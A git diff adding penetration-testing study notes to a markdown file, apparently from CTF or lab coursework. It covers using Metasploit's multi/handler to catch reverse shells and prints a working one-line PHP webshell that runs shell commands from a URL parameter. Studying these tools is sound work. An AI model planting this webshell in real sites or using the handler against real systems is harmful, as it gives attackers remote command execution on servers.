@@ -131,3 +131,29 @@ This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpret
 
 A Linux 32bit stageless Meterpreter payload would look like this:
 `linux/x86/meterpreter_reverse_tcp`
+
+# Metasploit multi/handler
+Multi/Handler is a superb tool for catching reverse shells. <br>
+Fortunately, it's relatively easy to use:
+* Open Metasploit with `msfconsole`
+* Type `use multi/handler`, and press enter
+* See options available with the `options` command
+* Then run the following commands:
+  *  `set PAYLOAD <payload>`
+  *  `set LHOST <listen-address>`
+  *  `set LPORT <listen-port>`
+* Start listener using `exploit -j` command
+  When the staged payload is run by the target, Metasploit receives the connection and sends the remainder of the payload and finally gives us a reverse shell
+<br> `multi/handler` will get backgrounded. To forground it:
+  * `sessions` : See all active sessions
+  * `sessions <number>`
+ 
+# WebShells
+* WebShell is a script that runs inside a webserver(PHP or ASP lang.)
+* Commands are entered though-
+    * HTML Form
+    * URL Arguments
+* In a very basic one line format(What happens under the hood):
+```php
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
